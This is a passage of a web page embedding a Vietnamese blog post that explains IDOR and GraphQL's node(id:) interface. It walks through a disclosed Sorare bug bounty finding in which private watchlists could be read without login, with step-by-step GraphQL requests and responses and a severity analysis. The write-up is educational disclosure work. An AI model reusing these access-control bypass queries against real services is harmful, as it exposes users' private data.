            <div className="prose" style={{marginTop:"26px"}} dangerouslySetInnerHTML={{__html: "<h1 id=\"s-1\" data-toc>Chương 1 — Cơ sở Lý thuyết</h1>\n<h2 id=\"s-2\" data-toc>1.1 Lỗ hổng IDOR</h2>\n<h3 id=\"s-3\" data-toc>IDOR là gì?</h3>\n<p>IDOR — Insecure Direct Object Reference (Tham chiếu đối tượng trực tiếp không an toàn) là lỗ hổng xảy ra khi ứng dụng cho phép người dùng truy cập thẳng vào một tài nguyên chỉ bằng ID, mà không kiểm tra họ có quyền xem tài nguyên đó không.</p>\n<h3 id=\"s-4\" data-toc>Ví dụ đơn giản</h3>\n<p>Giả sử bạn vừa đặt hàng online và nhận được link xem đơn hàng:</p>\n<pre><code>https://shop.com/orders/10045\n</code></pre>\n<p>Bạn thử đổi số thành <code>10044</code>:</p>\n<pre><code>https://shop.com/orders/10044\n</code></pre>\n<p>Nếu server trả về đơn hàng của người khác — đó là IDOR.</p>\n<h3 id=\"s-5\" data-toc>Tại sao IDOR xảy ra?</h3>\n<p>Vấn đề nằm ở logic phía server. Hãy so sánh hai cách xử lý:</p>\n<p><strong>Sai — dễ bị IDOR:</strong></p>\n<pre><code>Nhận ID → Tìm trong database → Trả về luôn\n</code></pre>\n<p><strong>Đúng:</strong></p>\n<pre><code>Nhận ID → Tìm trong database → Kiểm tra: người gọi có phải chủ sở hữu không? → Mới trả về\n</code></pre>\n<p>Developer thường quên bước kiểm tra quyền ở một số endpoint nhất định — đặc biệt các endpoint &quot;tiện ích&quot; được thêm vào sau, hoặc các interface dùng chung như <code>node(id:)</code> trong GraphQL (sẽ giải thích ở phần 1.3).</p>\n<h3 id=\"s-6\" data-toc>IDOR nguy hiểm đến mức nào?</h3>\n<p>IDOR nằm trong danh sách OWASP Top 10 — top 10 lỗ hổng web nguy hiểm nhất thế giới. Một số vụ thực tế:</p>\n<table>\n<thead>\n<tr>\n<th>Năm</th>\n<th>Nền tảng</th>\n<th>Hậu quả</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>2021</td>\n<td>Pandabuy</td>\n<td>Lộ 3 triệu đơn hàng của người dùng</td>\n</tr>\n<tr>\n<td>2022</td>\n<td>Optus (Úc)</td>\n<td>Lộ dữ liệu cá nhân 11 triệu khách hàng</td>\n</tr>\n<tr>\n<td>2023</td>\n<td>T-Mobile</td>\n<td>Lộ thông tin hàng triệu tài khoản</td>\n</tr>\n</tbody></table>\n<hr>\n<h2 id=\"s-7\" data-toc>1.2 API là gì?</h2>\n<p>Hãy tưởng tượng bạn đang ngồi ở một nhà hàng. Bạn không vào thẳng bếp để lấy đồ ăn — thay vào đó, bạn gọi phục vụ, đưa yêu cầu, và phục vụ mang đồ ra cho bạn.</p>\n<p>API (Application Programming Interface) hoạt động theo cách tương tự:</p>\n<pre><code>Client (App / Trình duyệt)\n        │\n        │  Gửi yêu cầu (Request)\n        ▼\n┌──────────────┐\n│     API      │  ← Kiểm tra quyền, xử lý logic\n└──────────────┘\n        │\n        │  Trả về dữ liệu (Response)\n        ▼\n      Server / Database\n</code></pre>\n<ul>\n<li>Client không trực tiếp truy cập vào database</li>\n<li>API là lớp trung gian — nhận yêu cầu, kiểm tra quyền, trả về dữ liệu phù hợp</li>\n<li>Mọi thứ bạn thấy trên web (feed, profile, danh sách sản phẩm...) đều đi qua API</li>\n</ul>\n<blockquote>\n<p>API giống như bảo vệ tòa nhà — kiểm soát ai được vào, được lấy gì. IDOR xảy ra khi bảo vệ này không hỏi thẻ trước khi cho vào.</p>\n</blockquote>\n<hr>\n<h2 id=\"s-8\" data-toc>1.3 REST API vs GraphQL</h2>\n<p>Có nhiều &quot;ngôn ngữ&quot; để API giao tiếp. Hai phổ biến nhất là REST và GraphQL.</p>\n<h3 id=\"s-9\" data-toc>REST API — Cách truyền thống</h3>\n<p>Mỗi loại dữ liệu có một đường dẫn (endpoint) riêng:</p>\n<pre><code>GET /users/123          → lấy thông tin user 123\nGET /users/123/posts    → lấy bài viết của user 123\nGET /watchlists/456     → lấy watchlist 456\n</code></pre>\n<p>Muốn lấy gì thì gọi đúng đường dẫn đó.</p>\n<h3 id=\"s-10\" data-toc>GraphQL — Cách hiện đại</h3>\n<p>GraphQL chỉ có một endpoint duy nhất (<code>/graphql</code>), nhưng client tự mô tả chính xác dữ liệu mình cần thông qua một ngôn ngữ truy vấn riêng.</p>\n<p>Nếu bạn đã từng viết SQL, GraphQL query sẽ rất quen thuộc:</p>\n<pre><code class=\"language-sql\">-- SQL truyền thống\nSELECT username, email\nFROM users\nWHERE slug = &#39;alice&#39;\n</code></pre>\n<pre><code class=\"language-graphql\"># GraphQL — ý tưởng tương tự, cú pháp khác\nquery {\n  user(slug: &quot;alice&quot;) {\n    username\n    email\n  }\n}\n</code></pre>\n<p>Thậm chí có thể join nhiều bảng trong một query — tương tự JOIN trong SQL:</p>\n<pre><code class=\"language-sql\">-- SQL: lấy user + danh sách watchlist + tên cầu thủ trong watchlist\nSELECT u.username, w.title, p.displayName\nFROM users u\nJOIN watchlists w ON w.owner_id = u.id\nJOIN players p ON p.watchlist_id = w.id\nWHERE u.slug = &#39;alice&#39;\n</code></pre>\n<pre><code class=\"language-graphql\"># GraphQL: cùng dữ liệu, một request duy nhất\nquery {\n  user(slug: &quot;alice&quot;) {\n    username\n    watchlists {\n      title\n      players { displayName }\n    }\n  }\n}\n</code></pre>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>REST</th>\n<th>GraphQL</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Số endpoint</td>\n<td>Nhiều</td>\n<td>Một (<code>/graphql</code>)</td>\n</tr>\n<tr>\n<td>Dữ liệu trả về</td>\n<td>Cố định theo endpoint</td>\n<td>Client tự chọn field</td>\n</tr>\n<tr>\n<td>Phổ biến ở</td>\n<td>API truyền thống</td>\n<td>App hiện đại (Sorare, GitHub, Shopify...)</td>\n</tr>\n</tbody></table>\n<h3 id=\"s-11\" data-toc>`node(id:)` — Interface đặc biệt trong GraphQL</h3>\n<p>Nhiều hệ thống GraphQL triển khai một interface gọi là <code>node(id:)</code> — hoạt động như một &quot;cổng tra cứu toàn năng&quot;: biết ID của object nào cũng có thể truy vấn thẳng đến nó, bất kể loại object là gì.</p>\n<p>Tương đương SQL sẽ là:</p>\n<pre><code class=\"language-sql\">-- Tìm bất kỳ object nào theo ID, không phân biệt bảng\nSELECT * FROM any_table WHERE global_id = &#39;63ba06b8-...&#39;\n</code></pre>\n<pre><code class=\"language-graphql\"># GraphQL: node(id:) làm đúng điều đó\nquery {\n  node(id: &quot;Watchlist:63ba06b8-...&quot;) {\n    ... on Watchlist { title public }\n  }\n}\n</code></pre>\n<blockquote>\n<p><strong>Lưu ý:</strong> <code>node(id:)</code> rất tiện — nhưng cũng là điểm nguy hiểm nếu quên kiểm tra quyền truy cập, vì nó có thể resolve bất kỳ loại object nào trong hệ thống.</p>\n</blockquote>\n<hr>\n<h2 id=\"s-12\" data-toc>1.4 Tóm tắt — Kết nối vào bug sắp phân tích</h2>\n<table>\n<thead>\n<tr>\n<th>Khái niệm</th>\n<th>Vai trò trong bug này</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>IDOR</td>\n<td>Lớp lỗ hổng mà bug này thuộc về</td>\n</tr>\n<tr>\n<td>API / GraphQL</td>\n<td>Nền tảng API mà Sorare sử dụng</td>\n</tr>\n<tr>\n<td><code>node(id:)</code></td>\n<td>Interface GraphQL bị khai thác để bypass access control</td>\n</tr>\n<tr>\n<td>Watchlist</td>\n<td>Object bị lộ dữ liệu dù đã được đặt thành private</td>\n</tr>\n</tbody></table>\n<p>Với nền tảng lý thuyết trên, chúng ta sẽ đi vào phân tích cụ thể bug được tìm thấy trên Sorare — một IDOR thực tế, đã được xác nhận và reward bởi chương trình Bug Bounty.</p>\n<hr>\n<h1 id=\"s-13\" data-toc>Chương 2 — Case Study: Private Watchlist accessible to unauthenticated users via node(id:) interface | Reward 250 usd | Low security impact</h1>\n<h2 id=\"s-14\" data-toc>2.1 Mục tiêu — Sorare (HackerOne)</h2>\n<p>Sorare là nền tảng game fantasy football kết hợp NFT, cho phép người chơi mua, bán và thu thập card cầu thủ kỹ thuật số, sau đó dùng chúng để tham gia các giải đấu.</p>\n<p>Sorare sử dụng GraphQL API tại endpoint <code>https://api.sorare.com/graphql</code> cho toàn bộ hoạt động của ứng dụng.</p>\n<p>Chương trình Bug Bounty của Sorare được vận hành trên nền tảng HackerOne tại <code>https://hackerone.com/sorare</code>.</p>\n<h3 id=\"s-15\" data-toc>Watchlist trong Sorare là gì?</h3>\n<p>Watchlist là tính năng cho phép người dùng tạo danh sách theo dõi cầu thủ mà họ quan tâm — tương tự &quot;playlist&quot; nhưng dành cho cầu thủ bóng đá.</p>\n<p>Mỗi Watchlist có hai chế độ:</p>\n<table>\n<thead>\n<tr>\n<th>Chế độ</th>\n<th>Ý nghĩa</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>public: true</code></td>\n<td>Bất kỳ ai cũng có thể xem</td>\n</tr>\n<tr>\n<td><code>public: false</code></td>\n<td>Chỉ chủ sở hữu mới được xem</td>\n</tr>\n</tbody></table>\n<blockquote>\n<p><strong>Tại sao Watchlist lại nhạy cảm?</strong> Danh sách cầu thủ một người theo dõi có thể tiết lộ chiến lược đầu tư hoặc kế hoạch mua card trong thị trường NFT — thông tin có giá trị thực tế.</p>\n</blockquote>\n<hr>\n<h2 id=\"s-16\" data-toc>2.2 Mô tả lỗ hổng</h2>\n<h3 id=\"s-17\" data-toc>Vấn đề nằm ở đâu?</h3>\n<p>Sorare có hai cách để truy vấn Watchlist qua GraphQL:</p>\n<p><strong>Cách 1 — <code>publicWatchlists</code>:</strong> Truy vấn danh sách watchlist công khai của một user.</p>\n<pre><code class=\"language-graphql\">query {\n  user(slug: &quot;alice&quot;) {\n    publicWatchlists(sport: FOOTBALL) {\n      nodes { id title public }\n    }\n  }\n}\n</code></pre>\n<p>Endpoint này có kiểm tra flag <code>public</code> — nếu watchlist là private, nó sẽ không xuất hiện.</p>\n<p><strong>Cách 2 — <code>node(id:)</code>:</strong> Truy vấn thẳng đến một object bằng ID.</p>\n<pre><code class=\"language-graphql\">query {\n  node(id: &quot;Watchlist:63ba06b8-...&quot;) {\n    ... on Watchlist { id title public }\n  }\n}\n</code></pre>\n<p>Endpoint này <strong>không</strong> kiểm tra flag <code>public</code> — trả về dữ liệu bất kể watchlist là public hay private.</p>\n<h3 id=\"s-18\" data-toc>Hậu quả</h3>\n<p>Hai endpoint xử lý cùng một loại dữ liệu nhưng chỉ một bên thực thi access control. Đây là điểm mấu chốt tạo ra lỗ hổng IDOR.</p>\n<pre><code>publicWatchlists  →  Kiểm tra quyền   →  An toàn\nnode(id:)         →  Bỏ qua kiểm tra  →  Lộ dữ liệu\n</code></pre>\n<hr>\n<h2 id=\"s-19\" data-toc>2.3 Attack Chain</h2>\n<p>Dưới đây là chuỗi tấn công hoàn chỉnh từ đầu đến cuối:</p>\n<pre><code>┌─────────────────────────────────────────────────────────────┐\n│                        ATTACK CHAIN                         │\n├─────────────────────────────────────────────────────────────┤\n│                                                             │\n│  [1] Victim tạo Watchlist PUBLIC, thêm cầu thủ vào          │\n│                        │                                    │\n│                        ▼                                    │\n│  [2] Attacker truy vấn publicWatchlists → lấy được UUID     │\n│      (không cần đăng nhập)                                  │\n│                        │                                    │\n│                        ▼                                    │\n│  [3] Victim đổi Watchlist sang PRIVATE                      │\n│      → Victim nghĩ dữ liệu đã được bảo vệ                   │\n│                        │                                    │\n│                        ▼                                    │\n│  [4] publicWatchlists → trả về rỗng (hoạt động đúng)        │\n│                        │                                    │\n│                        ▼                                    │\n│  [5] Attacker dùng node(id: UUID) → đọc được toàn bộ        │\n│      dữ liệu private — không cần đăng nhập                  │\n│                                                             │\n└─────────────────────────────────────────────────────────────┘\n</code></pre>\n<blockquote>\n<p><strong>Điểm mấu chốt:</strong> UUID được thu thập ở bước [2] — khi watchlist còn public. Sau khi victim đổi sang private, UUID đó vẫn còn hiệu lực với <code>node(id:)</code>. Victim không có cách nào biết UUID đã bị lưu lại.</p>\n</blockquote>\n<hr>\n<h2 id=\"s-20\" data-toc>2.4 Steps to Reproduce</h2>\n<h3 id=\"s-21\" data-toc>Chuẩn bị</h3>\n<p>Cần hai tài khoản Sorare: một đóng vai Victim, một đóng vai Attacker.</p>\n<hr>\n<h3 id=\"s-22\" data-toc>Bước 1 — Victim tạo Watchlist public và thêm cầu thủ</h3>\n<p>Victim tạo một watchlist ở chế độ public và thêm cầu thủ vào. Đây là trạng thái ban đầu hoàn toàn bình thường — người dùng chia sẻ watchlist của mình với cộng đồng.</p>\n<p><strong>Request:</strong></p>\n<pre><code class=\"language-graphql\">mutation {\n  upsertWatchlist(input: { sport: FOOTBALL, title: &quot;My Watchlist&quot;, public: true }) { ... }\n}\n</code></pre>\n<p><strong>Response:</strong></p>\n<pre><code class=\"language-json\">{ &quot;id&quot;: &quot;Watchlist:63ba06b8-...&quot;, &quot;title&quot;: &quot;My Watchlist&quot;, &quot;public&quot;: true }\n</code></pre>\n<hr>\n<h3 id=\"s-23\" data-toc>Bước 2 — Attacker thu thập UUID từ watchlist public</h3>\n<p>Attacker truy vấn danh sách public watchlist của victim — không cần đăng nhập. UUID lộ ra ở đây là thứ attacker cần lưu lại. Đây là bước chuẩn bị — hoàn toàn hợp lệ vì watchlist đang public.</p>\n<p><strong>Request:</strong></p>\n<pre><code class=\"language-graphql\">query {\n  user(slug: &quot;victim_username&quot;) {\n    publicWatchlists(sport: FOOTBALL) { nodes { id title } }\n  }\n}\n</code></pre>\n<p><strong>Response:</strong></p>\n<pre><code class=\"language-json\">{ &quot;id&quot;: &quot;Watchlist:63ba06b8-...&quot;, &quot;title&quot;: &quot;My Watchlist&quot;, &quot;public&quot;: true }\n</code></pre>\n<pre><code class=\"language-bash\"># Attacker lưu lại UUID này\nWL_ID=&quot;Watchlist:63ba06b8-a3cf-444e-9bf9-e3376a36b67f&quot;\n</code></pre>\n<hr>\n<h3 id=\"s-24\" data-toc>Bước 3 — Victim đổi Watchlist sang private</h3>\n<p>Victim quyết định bảo vệ dữ liệu của mình bằng cách chuyển watchlist sang chế độ private.</p>\n<p><strong>Request:</strong></p>\n<pre><code class=\"language-graphql\">mutation {\n  upsertWatchlist(input: { watchlistId: &quot;Watchlist:63ba06b8-...&quot;, public: false }) { ... }\n}\n</code></pre>\n<p><strong>Response:</strong></p>\n<pre><code class=\"language-json\">{ &quot;id&quot;: &quot;Watchlist:63ba06b8-...&quot;, &quot;title&quot;: &quot;My Watchlist&quot;, &quot;public&quot;: false }\n</code></pre>\n<hr>\n<h3 id=\"s-25\" data-toc>Bước 4 — Xác nhận watchlist đã bị ẩn khỏi đường dẫn hợp lệ</h3>\n<p>Kiểm tra lại qua <code>publicWatchlists</code> — danh sách trả về rỗng, đúng như kỳ vọng. Victim nhìn thấy kết quả này và tin rằng dữ liệu đã được bảo vệ.</p>\n<p><strong>Response:</strong></p>\n<pre><code class=\"language-json\">{ &quot;publicWatchlists&quot;: { &quot;nodes&quot;: [] } }\n</code></pre>\n<hr>\n<h3 id=\"s-26\" data-toc>Bước 5 — Attacker đọc Watchlist private qua `node(id:)`</h3>\n<p>Attacker dùng UUID đã lưu từ Bước 2 để gọi thẳng vào <code>node(id:)</code>.</p>\n<p><strong>Request:</strong></p>\n<pre><code class=\"language-graphql\">query {\n  node(id: &quot;Watchlist:63ba06b8-...&quot;) {\n    ... on Watchlist { id title public user { slug } playersPanel { ... } }\n  }\n}\n</code></pre>\n<p><strong>Victim kỳ vọng:</strong> Watchlist đã private → request này phải bị từ chối hoặc trả về rỗng.</p>\n<pre><code class=\"language-json\">{ &quot;data&quot;: { &quot;node&quot;: null } }\n</code></pre>\n<p><strong>Thực tế xảy ra:</strong> Toàn bộ dữ liệu private bị trả về — không cần đăng nhập.</p>\n<pre><code class=\"language-json\">{\n  &quot;data&quot;: {\n    &quot;node&quot;: {\n      &quot;title&quot;: &quot;My Watchlist&quot;,\n      &quot;public&quot;: false,\n      &quot;user&quot;: { &quot;slug&quot;: &quot;victim_username&quot; },\n      &quot;totalPlayersCount&quot;: 1,\n      &quot;playersPanel&quot;: [\n        { &quot;anyPlayer&quot;: { &quot;displayName&quot;: &quot;Mohamed Salah&quot; } }\n      ]\n    }\n  }\n}\n</code></pre>\n<blockquote>\n<p><strong>Bug được xác nhận:</strong> <code>node(id:)</code> bỏ qua hoàn toàn flag <code>public: false</code> và trả về dữ liệu cho bất kỳ ai biết UUID.</p>\n</blockquote>\n<hr>\n<h2 id=\"s-27\" data-toc>2.5 Tác động (Impact) & Đánh giá Severity</h2>\n<h3 id=\"s-28\" data-toc>Dữ liệu thực sự bị lộ là gì?</h3>\n<p>Trước khi đánh giá mức độ nghiêm trọng, cần nhìn thẳng vào những gì attacker thực sự đọc được:</p>\n<table>\n<thead>\n<tr>\n<th>Field bị lộ</th>\n<th>Bản chất</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>title</code></td>\n<td>Tên watchlist do victim tự đặt</td>\n</tr>\n<tr>\n<td><code>slug</code></td>\n<td>Định danh công khai của watchlist</td>\n</tr>\n<tr>\n<td><code>user.slug</code></td>\n<td>Username công khai của victim</td>\n</tr>\n<tr>\n<td><code>displayName</code> của cầu thủ</td>\n<td>Tên cầu thủ — thông tin hoàn toàn công khai</td>\n</tr>\n</tbody></table>\n<blockquote>\n<p><strong>Không có:</strong> thông tin cá nhân (PII), email, mật khẩu, dữ liệu tài chính, địa chỉ ví crypto, hay bất kỳ thông tin nhạy cảm nào liên quan đến tài khoản.</p>\n</blockquote>\n<hr>\n<h3 id=\"s-29\" data-toc>Tại sao đây vẫn là bug hợp lệ?</h3>\n<p>Bug này có thật và đã được Sorare xác nhận và vá. Lý do nó hợp lệ:</p>\n<p><strong>Về mặt kỹ thuật</strong> — Hệ thống hoạt động sai so với intent. Victim chủ động đổi sang private với kỳ vọng dữ liệu được bảo vệ, nhưng server không thực thi điều đó trên <code>node(id:)</code>. Đây là broken access control rõ ràng.</p>\n<p><strong>Về mặt nguyên tắc</strong> — Người dùng có quyền thu hồi quyền truy cập vào dữ liệu của mình. Khi họ đổi sang private, hệ thống phải tôn trọng quyết định đó ở mọi endpoint.</p>\n<hr>\n<h3 id=\"s-30\" data-toc>Tại sao Sorare đánh giá là Low?</h3>\n<p>Sorare đánh giá bug này ở mức Low severity với lập luận:</p>\n<p><strong>1. Dữ liệu không nhạy cảm</strong></p>\n<p>Tất cả những gì bị lộ — tên watchlist, tên cầu thủ — đều là thông tin công khai. Không có PII hay dữ liệu tài chính nào bị ảnh hưởng.</p>\n<p><strong>2. Dữ liệu từng là public</strong></p>\n<p>Toàn bộ attack chain chỉ có thể xảy ra nếu victim đã từng public watchlist đó. Attacker không đọc được gì mà trước đây không ai thấy — họ chỉ tiếp tục đọc được thứ victim đã tự công bố.</p>\n<p><strong>3. Không có tác động tài chính</strong></p>\n<p>Watchlist không chứa giá mua, lịch sử giao dịch, hay tín hiệu thị trường nào. Không có con đường thực tế nào từ việc đọc watchlist dẫn đến thiệt hại vật chất.</p>\n<p><strong>4. CVSS Score</strong></p>\n<pre><code>AV:N  — Network: khai thác qua internet\nAC:L  — Attack Complexity: thấp, không cần điều kiện đặc biệt\nPR:N  — Privileges Required: không cần đăng nhập\nUI:N  — User Interaction: không cần victim thao tác gì thêm\nC:L   — Confidentiality: lộ dữ liệu ở mức thấp\nI:N   — Integrity: không ảnh hưởng\nA:N   — Availability: không ảnh hưởng\n\n→ CVSS Score: Low\n</code></pre>\n<hr>\n<h3 id=\"s-31\" data-toc>Bài học về Severity Assessment</h3>\n<p>Đây là điểm quan trọng mà người mới làm bug bounty hay nhầm:</p>\n<p><strong>Bug hợp lệ ≠ Bug nghiêm trọng</strong></p>\n<p>Một bug có thể real và được vá nhưng vẫn được đánh giá thấp nếu dữ liệu bị lộ không nhạy cảm. Severity phụ thuộc vào impact thực tế, không chỉ vào việc access control có bị bypass hay không.</p>\n<table>\n<thead>\n<tr>\n<th>Câu hỏi cần tự hỏi</th>\n<th>Trong bug này</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Dữ liệu bị lộ có nhạy cảm không?</td>\n<td>Không — tên cầu thủ, tên watchlist</td>\n</tr>\n<tr>\n<td>Attacker có thể làm gì với dữ liệu đó?</td>\n<td>Gần như không có hành động tiếp theo</td>\n</tr>\n<tr>\n<td>Victim có bị thiệt hại thực tế không?</td>\n<td>Không đo lường được</td>\n</tr>\n<tr>\n<td>Hành vi có đúng với intent của hệ thống không?</td>\n<td>Không — đây là lý do bug được chấp nhận</td>\n</tr>\n</tbody></table>\n<blockquote>\n<p><strong>Takeaway:</strong> Khi viết report bug bounty, đừng chỉ chứng minh bug tồn tại — hãy lập luận rõ dữ liệu bị lộ là gì và attacker có thể làm gì tiếp theo. Đó là yếu tố quyết định severity và reward.</p>\n</blockquote>\n<p><del>ai cần thông tin gì thêm về post này thì liên hệ<code>caterpie22</code> a</del></p>\n"}}></div></article>
